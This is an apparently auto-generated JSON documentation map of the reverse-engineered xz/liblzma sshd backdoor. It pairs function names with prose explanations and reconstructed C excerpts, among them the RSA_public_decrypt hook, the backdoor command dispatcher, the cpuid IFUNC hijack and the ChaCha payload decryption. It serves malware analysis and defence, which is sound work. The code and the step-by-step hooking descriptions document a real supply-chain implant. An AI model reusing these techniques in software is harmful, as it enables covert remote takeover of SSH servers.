{
  "RSA_public_decrypt": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/RSA_public_decrypt.c):\n    int hook_RSA_public_decrypt(\n    \tint flen, unsigned char *from,\n    \tunsigned char *to, RSA *rsa, int padding\n    ){\n    \tpfn_RSA_public_decrypt_t RSA_public_decrypt;\n    \n    \tif(!global_ctx) return 0;\n    \tif(!global_ctx->imported_funcs) return 0;\n    \tif(!(RSA_public_decrypt=global_ctx->imported_funcs->RSA_public_decrypt)) return 0;\n    \tif(!rsa){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \tBOOL call_orig = TRUE;\n    \tint result = run_backdoor_commands(rsa, global_ctx, &call_orig);\n    \tif(call_orig){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \treturn result;\n    }",
  "backdoor_commands": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/backdoor_commands.c):\n    #warning \"this function is WIP / needs validation\"\n    \n    /**\n     * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>\n     ** /\n    #include \"xzre.h\"\n    #include <assert.h>\n    #include <openssl/bn.h>\n    #include <string.h>\n    #include <sys/select.h>\n    #include <sys/types.h>\n    #include <time.h>\n    #include <errno.h>\n    \n    #define MONITOR_REQ_KEYALLOWED 22\n    \n    #define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))\n    #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)\n    #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))\n    #define SIZE_HEADERS SIZE_STEP2\n    #define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))\n    \n    // $FIXME: move to xzre.h\n    extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);\n    \n    BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){\n    \trun_backdoor_commands_data_t f = {0};\n    \tf.p_do_orig = do_orig;\n    \n    \tif(!ctx){\n    \t\texit_early:\n    \t\tif(!do_orig){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tgoto exit;\n    \t} else if(ctx->disable_backdoor\n    \t\t|| !rsa\n    \t\t|| !ctx->imported_funcs\n    \t\t|| !ctx->imported_funcs->RSA_get0_key\n    \t\t|| !ctx->imported_funcs->BN_bn2bin\n    \t){\n    \t\tctx->disable_backdoor = TRUE;\n    \t\tgoto exit_early;\n    \t}\n    \n    \tif(do_orig){\n    \t\tdo {\n    \t\t\t*f.p_do_orig = TRUE;\n    \t\t\n    \t\t\tctx->imported_funcs->RSA_get0_key(\n    \t\t\t\trsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);\n    \t\t\tif(!f.kctx.rsa_n || !f.kctx.rsa_e) break;\n    \t\t\tif(!ctx->imported_funcs) break;\n    \t\t\tif(!ctx->imported_funcs->BN_num_bits) break;\n    \t\t\t\n    \t\t\tint num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);\n    \t\t\tif(num_n_bits > 0x4000) break;\n    \t\t\t\n    \t\t\tint num_n_bytes = X_BN_num_bytes(num_n_bits);\n    \t\t\tif(num_n_bytes > 536) break;\n    \t\t\t\n    \t\t\tint rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);\n    \t\t\tif(rsa_n_length < 0) break;\n    \t\t\tif(num_n_bytes < rsa_n_length) break;\n    \n    \t\t\tif(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;\n    \t\t\t// `field_a` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_a) goto exit;\n    \t\t\t// `field_b` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_b) goto exit;\n    \n    \t\t\tu64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);\n    \t\t\tif(cmd_type > 3) goto exit;\n    \n    \t\t\tif(!ctx->libc_imports) break;\n    \t\t\tif(!ctx->libc_imports->getuid) break;\n    \t\t\tif(!ctx->libc_imports->exit) break;\n    \t\t\tif(!ctx->sshd_log_ctx) break;\n    \t\t\tif(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;\n    \t\t\t*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;\n    \t\t\t\n    \t\t\tif(!secret_data_get_decrypted(f.kctx.ed448_key, ctx)) break;\n    \t\t\t// decrypt payload\n    \t\t\tif(!chacha_decrypt(\n    \t\t\t\tf.kctx.payload.body.signature,\n    \t\t\t\tnum_n_bytes - sizeof(backdoor_payload_hdr_t),\n    \t\t\t\tf.kctx.ed448_key,\n    \t\t\t\tf.kctx.ivec,\n    \t\t\t\t(u8 *)&f.kctx.payload.body,\n    \t\t\t\tctx->imported_funcs)) break;\n    \n    \t\t\tif(!ctx->sshd_sensitive_data) break;\n    \t\t\tif(!ctx->imported_funcs) break;\n    \n    \t\t\tstatic_assert(SIZE_HEADERS == 0x87);\n    \n    \t\t\tif((num_n_bytes - SIZE_STEP0) < ED448_SIGNATURE_SIZE) break;\n    \n    \t\t\tf.data.monitor.cmd_type = cmd_type;\n    \t\t\tif((num_n_bytes - SIZE_STEP1) < sizeof(cmd_arguments_t)) break;\n    \n    \t\t\tf.kctx.args = f.kctx.payload.body.args;\n    \t\t\t\n    \t\t\tint hostkey_hash_offset;\n    \t\t\tint body_size = num_n_bytes - SIZE_HEADERS;\n    \t\t\tint body_offset;\n    \t\t\tint size;\n    \t\t\tint data_s1, data_s2, payload_size;\n    \t\t\tu8 *data_ptr;\n    \n    \t\t\tif(cmd_type == 2){\n    \t\t\t\tsize = f.kctx.args.u.size;\n    \t\t\t\tif(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_NO_EXTENDED_SIZE)){\n    \t\t\t\t\tif(f.kctx.args.u.size) break;\n    \t\t\t\t\tdata_s1 = 0;\n    \t\t\t\t\tsize = 0x39;\n    \t\t\t\t\tdata_ptr = f.kctx.payload.body.data;\n    \t\t\t\t\tdata_s2 = 0;\n    \t\t\t\t} else {\n    \t\t\t\t\tif(TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_IMPERSONATE)){\n    ...",
  "backdoor_entry": "Executes inside liblzma's IFUNC resolver, counting invocations and calling `backdoor_init` on the second pass. This turns the seemingly harmless cpuid resolver into the backdoor's bootstrap path.",
  "backdoor_init": "Initialises the IFUNC entry context, locates the cpuid GOT slot, and swaps it to point at `backdoor_init_stage2`. From here the loader can patch ld.so and install the audit-based hooks without leaving the resolver frame.",
  "backdoor_init_stage2": "Executes inside the hijacked cpuid resolver, initialises shared globals and hook contexts, and loops until they're ready; once prepared it jumps into `backdoor_setup` and then restores the cpuid context. If setup fails, it still harvests cpuid data so the resolver can fall back cleanly.",
  "backdoor_setup": "Performs the full installation workflow: gathers link_map handles, initialises shared globals, resolves libc/libcrypto imports, rewires ld.so's audit structures, updates GOT/PLT entries, and seeds secret-data tracking. On success it leaves `backdoor_symbind64` registered so every sshd\u2192libcrypto call is mediated by the backdoor.",
  "bignum_serialize": "Writes a BIGNUM into a length-prefixed buffer, dropping redundant leading zeros so later hashes are stable. Key-fingerprinting helpers call it before running SHA256 over RSA or DSA parameters.",
  "bits": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/bits.c):\n    u32 count_bits(u64 x){\n    \tu32 result;\n    \tfor(result=0; x; ++result, x &= x-1);\n    \treturn result;\n    }",
  "c_memmove": "Implements memmove with overlap awareness without depending on libc. Early initialization uses it to shuffle saved instructions and GOT entries while the process is still running inside the IFUNC resolver sandbox.",
  "c_strlen": "Minimal strlen implementation that the loader can call before libc is safe to use. It shows up when scanning sshd buffers for protocol markers during the backdoor's environment checks.",
  "c_strnlen": "Bounded strlen helper used to cap string walks inside untrusted buffers. The backdoor leans on it while parsing ssh login structures so a malformed packet cannot drive the length probes out of bounds.",
  "call_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/call_instruction.c):\n    BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx){\n    \tif(!secret_data_append_from_address(NULL, (secret_data_shift_cursor_t){ 0x81 }, 4, 7)){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t ctx = {0};\n    \tif(!dctx){\n    \t\tdctx = &ctx;\n    \t}\n    \n    \twhile(code_start < code_end){\n    \t\tif(x86_dasm(dctx, code_start, code_end)){\n    \t\t\tif(XZDASM_OPC(dctx->opcode) == X86_OPCODE_CALL\n    \t\t\t\t&& (!call_target || &dctx->instruction[dctx->operand + dctx->instruction_size] == call_target)\n    \t\t\t){\n    \t\t\t\treturn TRUE;\n    \t\t\t}\n    \t\t\tcode_start += dctx->instruction_size;\n    \t\t} else {\n    \t\t\tcode_start += 1;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }\n    ",
  "chacha_decrypt": "Thin wrapper around OpenSSL's ChaCha20 decrypt primitives that operates through the resolved imports table. The backdoor uses it both to unwrap its embedded secrets and to decrypt attacker payloads after they arrive via the monitor channel.",
  "check_argument": "Scans a dash-prefixed argv string for forbidden switches like '-d'/'-D' or unusual characters and returns a pointer only when a disallowed flag is present. `process_is_sshd` relies on it to detect debug or non-daemon modes so the implant can stand down in those cases.",
  "check_backdoor_state": "Sanity-checks the payload buffer and state machine before processing more command data, resetting the state on any inconsistency. The loader calls it before and after decryptions to avoid reusing corrupted payloads.",
  "contains_null_pointers": "Scans a pointer array for NULL entries. The crypto helpers call it to ensure every required OpenSSL import was resolved before attempting decrypt or verify operations.",
  "count_bits": "Classic popcount loop that returns the number of set bits in a 64-bit value. The string-id trie and several instruction filters rely on it when they compress lookup tables for pattern matching.",
  "count_pointers": "Uses malloc_usable_size to count populated pointer slots in a heap block without knowing the allocation size. Secret-data heuristics use it when walking monitor tables extracted from sshd memory.",
  "cpuid_gcc": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  GCC-style CPUID helper that dispatches to the appropriate intrinsic wrapper for the requested leaf before returning EAX/EBX/ECX/EDX as separate pointers.\n\nNotes:\n  - Mirrors libgcc's cpuid shim, covering base, extended, and cache-topology leaves with dedicated helpers.\n  - Falls back to the raw __builtin_cpu_supports() thunk when a leaf is not special-cased.",
  "cpuid_got_index": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/cpuid_got_index.c):\n    void update_cpuid_got_index(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.cpuid_fn = (void *)cpuid_reloc_consts.cpuid_got_index;\n    }",
  "data_append_from_address": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_from_address.c):\n    BOOL secret_data_append_from_address(\n    \tvoid *addr,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tu8 *code = (u8 *)addr;\n    \tif((uintptr_t)addr <= 1){\n    \t\tcode = (u8 *)__builtin_return_address(0);\n    \t}\n    \treturn secret_data_append_singleton(\n    \t\taddr, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "data_append_from_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_from_instruction.c):\n    BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor){\n    \tif(cursor->index <= 0x1C7\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_MOV\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_CMP\n    \t&& !XZDASM_TEST_MASK(0x410100000101, 3, dctx->opcode)\n    \t){\n    \t\tglobal_ctx->secret_data[cursor->byte_index] |= 1 << (cursor->bit_index);\n    \t}\n    \t++cursor->index;\n    \treturn TRUE;\n    }",
  "data_append_item": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_item.c):\n    BOOL secret_data_append_item(\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned operation_index,\n    \tunsigned shift_count,\n    \tint index, u8 *code\n    ){\n    \treturn index && secret_data_append_singleton(\n    \t\tcode, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "data_append_singleton": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_singleton.c):\n    BOOL secret_data_append_singleton(\n    \tu8 *call_site, u8 *code,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tif(global_ctx && !global_ctx->shift_operations[operation_index]){\n    \t\tglobal_ctx->shift_operations[operation_index] = TRUE;\n    \t\tvoid *func_start = NULL;\n    \t\tif(!find_function(\n    \t\t\tcode, &func_start, NULL,\n    \t\t\tglobal_ctx->lzma_code_start,\n    \t\t\tglobal_ctx->lzma_code_end,\n    \t\t\tFIND_NOP\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tif(!secret_data_append_from_code(\n    \t\t\tfunc_start, global_ctx->lzma_code_end,\n    \t\t\tshift_cursor, shift_count,\n    \t\t\tcall_site == NULL\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tglobal_ctx->num_shifted_bits += shift_count;\n    \t}\n    \treturn TRUE;\n    }",
  "data_get_decrypted": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_get_decrypted.c):\n    struct key_buf {\n    \tu8 key[CHACHA20_KEY_SIZE];\n    \tu8 iv[CHACHA20_IV_SIZE];\n    };\n    \n    BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx){\n    \tif(!output || !ctx || !ctx->imported_funcs){\n    \t\treturn FALSE;\n    \t}\n    \tstruct key_buf buf1 = {0}, buf2 = {0};\n    \tif(!chacha_decrypt(\n    \t\t(u8 *)&buf1, sizeof(buf1),\n    \t\tbuf1.key, buf1.iv,\n    \t\t(u8 *)&buf2, ctx->imported_funcs)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \treturn chacha_decrypt(\n    \t\tctx->secret_data, sizeof(ctx->secret_data),\n    \t\tbuf2.key, buf2.iv,\n    \t\toutput, ctx->imported_funcs);\n    }",
  "decrypt": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/decrypt.c):\n    BOOL chacha_decrypt(\n    \tu8 *in, int inl,\n    \tu8 *key, u8 *iv,\n    \tu8 *out, imported_funcs_t *funcs\n    ){\n    \tint outl = 0;\n    \tif(!in || inl <= 0 || !iv || !out || !funcs) {\n    \t\treturn FALSE;\n    \t}\n    \tif(contains_null_pointers((void **)&funcs->EVP_CIPHER_CTX_new, 6)){\n    \t\treturn FALSE;\n    \t}\n    \tEVP_CIPHER_CTX *ctx = funcs->EVP_CIPHER_CTX_new();\n    \tif(!ctx){\n    \t\treturn FALSE;\n    \t}\n    \tconst EVP_CIPHER *cipher = EVP_chacha20();\n    \tif(funcs->EVP_DecryptInit_ex(ctx, cipher, NULL, key, iv) == TRUE\n    \t  && funcs->EVP_DecryptUpdate(ctx, out, &outl, in, inl) == TRUE\n    \t  && outl >= 0\n    \t){\n    \t\tif(funcs->EVP_DecryptFinal_ex(ctx, &out[outl], &outl) == TRUE\n    \t\t && outl >= 0 && inl >= outl\n    \t\t){\n    \t\t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \tif(funcs->EVP_CIPHER_CTX_free){\n    \t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t}\n    \treturn FALSE;\n    }",
  "decrypt_payload_message": "Decrypts an incoming key_payload_t chunk with the recovered ChaCha key, appends it to the staged buffer, and advances the payload state machine. This is how multi-part attacker commands are reassembled before verification.",
  "dsa_key_hash": "Serialises the DSA public parameters and computes a SHA-256 digest using the resolved libcrypto helpers. The monitor hooks use that fingerprint to recognise host keys referenced by attacker commands without leaking the private material.",
  "elf_contains_vaddr": "Convenience wrapper around the range validator that enforces a protection mask on the containing segment. The loader uses it when double-checking GOT and relocation targets prior to overwriting them with backdoor pointers.",
  "elf_contains_vaddr_impl": "Validates that a virtual-address range is fully covered by a PT_LOAD segment whose flags include the requested mask. Stage two calls it before touching candidate addresses so the backdoor never probes unmapped pages while hunting for hooks.",
  "elf_contains_vaddr_relro": "Checks that a range lives inside both the requested protections and the GNU RELRO window tracked in elf_info_t. The loader uses it to confirm that planned writes stay inside the RELRO mapping it will temporarily relax with mprotect.",
  "elf_entry_ctx": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/elf_entry_ctx.c):\n    void init_elf_entry_ctx(elf_entry_ctx_t *ctx){\n    \tctx->symbol_ptr = (void *)&cpuid_random_symbol;\n    \tctx->got_ctx.return_address = (void *)ctx->frame_address[3];\n    \tupdate_got_offset(ctx);\n    \tupdate_cpuid_got_index(ctx);\n    \tctx->got_ctx.got_ptr = NULL;\n    }",
  "elf_find_function_pointer": "Takes a string-reference catalogue entry, locates the associated RELRO slot, and checks CET landing requirements before returning the pointer. The loader relies on it to identify sshd callback tables\u2014such as monitor handlers\u2014that it will later overwrite with backdoor functions.",
  "elf_find_rela_reloc": "Walks the RELA relocation table looking for entries tied to a specific symbol id and optional address window. The backdoor uses it to pinpoint writable GOT records\u2014such as the cpuid thunk or libc imports\u2014that must be rewritten with malicious destinations.",
  "elf_find_relr_reloc": "Expands RELR-compressed relocation runs and tests each decoded slot against the requested symbol id and range. This lets the implant track down the optimized RELR entries backing sshd's cpuid reference before it swaps in its handler.",
  "elf_find_string": "Scans the cached .rodata segment for an encoded string id, optionally starting from a caller-supplied offset. The scoring engine invokes it to map string constants back to the routines that reference them inside sshd.",
  "elf_find_string_reference": "Finds the first instruction that references a specific string literal between the supplied code bounds. The loader uses this pinpoint search to anchor subsequent pattern matching when triangulating hook targets from log messages and status strings.",
  "elf_find_string_references": "Indexes interesting .rodata strings and the instructions that reference them, recording surrounding function bounds for later lookups. Many downstream heuristics consume this table to locate sshd routines and global pointers tied to sensitive behaviour.",
  "elf_get_code_segment": "Finds and caches the first executable PT_LOAD segment and returns its span. Pattern-matching helpers bound their scans to this region when analysing sshd and libcrypto for hook anchors.",
  "elf_get_data_segment": "Returns the final read/write PT_LOAD segment along with either its size or alignment padding. The implant uses the spare space after that segment to stash its backdoor_hooks_data and to learn where GOT-adjacent payloads can be tucked safely.",
  "elf_get_got_symbol": "Resolves the GOT slot associated with the given symbol through RELA metadata. Stage two uses it to fetch the writable entry that will be patched to point at the backdoor wrappers.",
  "elf_get_plt_symbol": "Locates the PLT stub associated with the given symbol. The symbind trampoline inspects it so the audit hook can capture sshd\u2192libcrypto calls at the exact dispatch site.",
  "elf_get_reloc_symbol": "Searches a relocation array for the matching relocation type and symbol name, then returns the relocated address. It supplies the raw pointers that the loader later feeds into its hook tables and secret-data collectors.",
  "elf_get_rodata_segment": "Identifies the read-only data segment and records its size. The sensitive-data heuristics walk that slice to match format strings that betray interesting handlers before they attach hooks.",
  "elf_parse": "Parses an in-memory ELF image and populates elf_info_t with segment, relocation, and string-table metadata. Backdoor initialization runs it against sshd, libcrypto, libc, and the dynamic linker so later heuristics have structured views of each module.",
  "elf_symbol_get": "Resolves a symbol descriptor by encoded string id inside a parsed ELF. The loader calls it to pull libcrypto and libc entry points that will later be wrapped or invoked from the malicious audit shims.",
  "elf_symbol_get_addr": "Translates a resolved symbol descriptor into a live address within the mapped object. The backdoor stores those pointers in its global context so the symbind and message-handling hooks can jump back into the legitimate code paths when needed.",
  "endbr64_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/endbr64_instruction.c):\n    BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part){\n    \tif((code_end - code_start) > 3){\n    \t\treturn *code_start + (low_mask_part | 0x5E20000) == 0xF223;\n    \t}\n    \treturn FALSE;\n    }",
  "entry": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/entry.c):\n    unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame){\n    \tu32 a = 0, b = 0, c = 0, d = 0;\n    \telf_entry_ctx_t state;\n    \n    \tif(resolver_call_count == 1){\n    \t\tstate.symbol_ptr = (void *)1;\n    \t\tmemset(&state.got_ctx, 0x00, sizeof(state.got_ctx));\n    \t\tstate.frame_address = caller_frame;\n    \t\tbackdoor_init(&state, caller_frame);\n    \t}\n    \t++resolver_call_count;\n    \t_cpuid_gcc(cpuid_request, &a, &b, &c, &d);\n    \treturn a;\n    }",
  "extract_payload_message": "Parses an sshbuf blob to locate the RSA modulus portion, updating the buffer pointer and reporting its length. The command decoder uses it to peel the attacker payload out of host-key certificates carried over the monitor channel.",
  "fake_lzma_alloc": "Pretends to be the liblzma allocator and returns the address of the symbol identified by the encoded string id parameter. Stage two feeds it to ld.so so symbol lookups appear benign while the backdoor harvests resolver addresses for later patches.",
  "fake_lzma_free": "No-op free callback that mirrors the signature of the liblzma allocator interface. The backdoor advertises it to ld.so while hijacking the allocator struct so imported code continues to look legitimate during setup.",
  "fd_read": "Wrapper around libc's read that retries on EINTR and honours the resolver-provided imports table. All socket reads during monitor spoofing go through it so the implant never depends on glibc symbols directly.",
  "fd_write": "Companion wrapper for write with EINTR handling. It powers every forged monitor message the backdoor emits while replaying commands or proxying authentication traffic.",
  "find_add_instruction_with_mem_operand": "Locates ADD instructions that update memory at a given address, capturing the scale of the increment. The scoring logic uses it to observe how sshd mutates counters so the implant can tag sensitive buffers.",
  "find_addr_referenced_in_mov_instruction": "Scans a referenced function for MOV instructions that materialise an address inside the supplied data window. The backdoor uses it to recover struct-field pointers (for example the monitor sockets) so it can redirect them to its own handlers.",
  "find_call_instruction": "Disassembles forward until it encounters a CALL opcode and reports both the instruction and target. The hook finder uses it to locate indirect dispatcher sites in sshd so the injected shims can be spliced in safely.",
  "find_dl_audit_offsets": "Orchestrates the discovery of `l_name`, `_dl_naudit`, `_dl_audit`, and `l_audit_any_plt` offsets, resolving extra libcrypto helpers along the way. `backdoor_setup` relies on the resulting hooks context to rewire ld.so's audit plumbing to its own symbind handler.",
  "find_dl_naudit": "Matches the `_dl_naudit` and `_dl_audit` references inside ld.so, records their offsets within `__rtld_global_ro`, and resolves a few extra crypto routines. Those offsets let the implant point ld.so's global audit state at its forged interface.",
  "find_function": "Combines the prologue scan with a forward sweep to determine both the start and end addresses of a function. Backdoor initialization relies on it when it needs exact bounds for copying original bytes or scheduling follow-up pattern searches.",
  "find_function_prologue": "Sweeps backward from a code pointer looking for a plausible function prologue based on decoded instruction patterns. The runtime loader uses it to recover entry points in stripped sshd/libc images before installing hooks.",
  "find_instruction_with_mem_operand": "Convenience wrapper that searches for MOV/LEA forms touching a specific address and reports the displacement. It feeds higher-level routines that locate struct fields for the backdoor's runtime patch table.",
  "find_instruction_with_mem_operand_ex": "Performs a generic sweep for any instruction that touches memory, applying a caller-supplied predicate to filter the operands. The loader routes specialised searches through it when reconstructing complex data flows in sshd.",
  "find_lea_instruction": "Finds the next LEA instruction in the stream and returns operand details. The backdoor uses this to recover base-plus-offset calculations that point at data structures it later siphons.",
  "find_lea_instruction_with_mem_operand": "Restricts the LEA search to instructions that materialize a specific memory address, including displacement checks. It is invoked when the implant needs to confirm the exact offset of sshd globals before patching them.",
  "find_link_map_l_audit_any_plt": "Locates the offset of `l_audit_any_plt` inside `struct link_map` and then invokes the bitmask helper to learn how to toggle it. Together they arm the backdoor with everything needed to mark target modules as audited.",
  "find_link_map_l_audit_any_plt_bitmask": "Disassembles `_dl_audit_symbind_alt` to recover the load/test sequence for `link_map::l_audit_any_plt`, yielding both the flag address and the bitmask ld.so uses. The loader stores those values so it can flip the flag for sshd and libcrypto when masquerading as an audit module.",
  "find_link_map_l_name": "Walks ld.so's link_map records to locate the `l_name` string slot, verifies the offsets inside `_dl_audit_*`, and resolves several libc/libcrypto helpers. The backdoor needs that offset to rewrite libcrypto's link_map so the audit machinery accepts its injected interface.",
  "find_mov_instruction": "Searches for MOV instructions with configurable load/store semantics and hands back the matched operands. It underpins many of the signature searches the implant runs while deriving addresses for secret data or resolver trampolines.",
  "find_mov_lea_instruction": "Iterates through MOV and LEA instructions that move pointers into registers, honouring load/store direction flags. The loader uses it to chase GOT writes and frame setups when it has to recover sensitive pointers for the backdoor context.",
  "find_reg2reg_instruction": "Searches a code range for register-to-register moves while enforcing CET-safe constraints. The implant uses it when it needs to follow pointer copies without touching memory operands during its pattern hunts.",
  "find_string_reference": "Scans for instructions that reference a given string literal via RIP-relative addressing and records the instruction span. Secret-data hunters use it to line up code blocks that print or parse target strings so hooks can score them.",
  "function": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/function.c):\n    BOOL find_function(\n    \tu8 *code_start,\n    \tvoid **func_start,\n    \tvoid **func_end,\n    \tu8 *search_base,\n    \tu8 *code_end,\n    \tFuncFindType find_mode\n    ){\n    \tu8 *res = NULL;\n    \t/** should we locate the function prologue? * /\n    \tif(func_start){\n    \t\tfor(u8 *p = code_start;\n    \t\t\tsearch_base < p && !find_function_prologue(p, code_end, &res, find_mode);\n    \t\t\t--p);\n    \n    \t\tif(!res || res == search_base && !find_function_prologue(search_base, code_end, NULL, find_mode)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*func_start = res;\n    \t}\n    \t/** should we locate the function epilogue? * /\n    \tif(func_end){\n    \t\tu8 *search_from = code_start + 1;\n    \t\tu8 *search_to = code_end - 4;\n    \t\tBOOL found;\n    \t\tfor(;search_from < search_to && \n    \t\t\t(found=find_function_prologue(search_from, code_end, NULL, find_mode)) == FALSE;\n    \t\t\t++search_from\n    \t\t);\n    \t\t// FIXME: in theory the first check is redundant, as it's covered by the second one\n    \t\tif(found || search_to != search_from || find_function_prologue(search_from, code_end, NULL, find_mode)){\n    \t\t\tcode_end = search_from;\n    \t\t}\n    \t\t*func_end = code_end;\n    \t}\n    \treturn TRUE;\n    }",
  "get_cpuid_modified": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Patched _get_cpuid implementation that routes the first resolver invocation through backdoor_entry() and only issues CPUID when the advertised maximum leaf covers the requested value.\n\nNotes:\n  - Uses backdoor_entry() to install stage-two payloads while the IFUNC resolver is running.\n  - Returns 0 when the resolved CPUID limit is lower than the requested leaf, preserving glibc's contract.",
  "get_elf_functions_address": "Returns the address of the bookkeeping structure that stores pointers to the ELF helper routines. Shared backdoor code uses it to hand the helper vtable to new contexts without hard-coding offsets.",
  "get_lzma_allocator": "Returns the embedded fake liblzma allocator structure. The loader hands this to ld.so so its covert symbol lookups appear as innocuous allocator callbacks.",
  "get_lzma_allocator_address": "Calculates the runtime address of the fake liblzma allocator structure embedded in the object. The loader publishes this pointer to ld.so so its forged allocator callbacks remain reachable while the backdoor piggybacks on the IFUNC payload.",
  "get_string_id": "Traverses the embedded string-trie and returns the encoded identifier for a runtime string. Every heuristic that matches sshd literals\u2014logging, monitor messages, protocol banners\u2014goes through this to avoid shipping plaintext strings in the payload.",
  "get_tls_get_addr_random_symbol_got_offset": "Seeds the entry context's GOT base and offset with the relocation constants tied to the canned `__tls_get_addr` symbol. Later code uses those values as the starting point when walking the PLT stub to discover the true GOT entry.",
  "globals": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Consolidated definition of global data that the backdoor expects to find in .bss/.data (.e.g resolver_call_count, global_ctx, hook tables, relocation constants, and the serialized string tables).\n\nNotes:\n  - Most pointers are initialised to zero so the loader or runtime patches can populate them.\n  - The large constant arrays mirror blobs copied straight out of the original liblzma object (branch tables, CRC masks, etc.).",
  "got_offset": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/got_offset.c):\n    void update_got_offset(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.got_offset = cpuid_reloc_consts.cpuid_random_symbol_got_offset;\n    }",
  "hook_EVP_PKEY_set1_RSA": "Observes when sshd wraps an RSA key in an EVP_PKEY, hands the key to `run_backdoor_commands`, and then falls through to the true OpenSSL routine. It guarantees the backdoor sees host keys even if the decrypt hook never fires.",
  "hook_RSA_get0_key": "Lets the backdoor inspect an RSA key whenever sshd queries it by calling `run_backdoor_commands` first, then invoking the genuine RSA_get0_key. The original behaviour is preserved, but the implant captures the key material for later use.",
  "hook_RSA_public_decrypt": "Replaces `RSA_public_decrypt` with a wrapper that feeds the RSA handle and ciphertext into `run_backdoor_commands` before deciding whether to call the real function. Once the audit symbind hook is active, this is the primary trigger that lets attacker payloads run.",
  "init_elf_entry_ctx": "Initialises the IFUNC entry context with the cpuid_random_symbol pointer, the resolver's return address, and the relocation constants. `backdoor_init` calls it as soon as the frame is captured so subsequent stages can patch the GOT safely.",
  "init_hooks_ctx": "Initialises the backdoor_hooks_ctx structure with pointers to the implant's hook stubs and shared data slots. backdoor_init_stage2 invokes it as a readiness check and interprets the 0x65 return value as \"shared globals not wired yet\" so setup can retry safely.",
  "init_imported_funcs": "Verifies the resolved-imports counter and ensures the three critical libcrypto PLT pointers are available, dropping in loader callbacks when they are not. The backdoor uses this guard before enabling the RSA hooks so it never intercepts calls without knowing how to fall back to the genuine routines.",
  "init_ldso_ctx": "Restores saved ld.so bookkeeping values (audit flags, _dl_audit pointers, naudit count) back to their pre-hook state. The loader calls it whenever hook setup fails so the dynamic linker is left consistent before sshd resumes execution.",
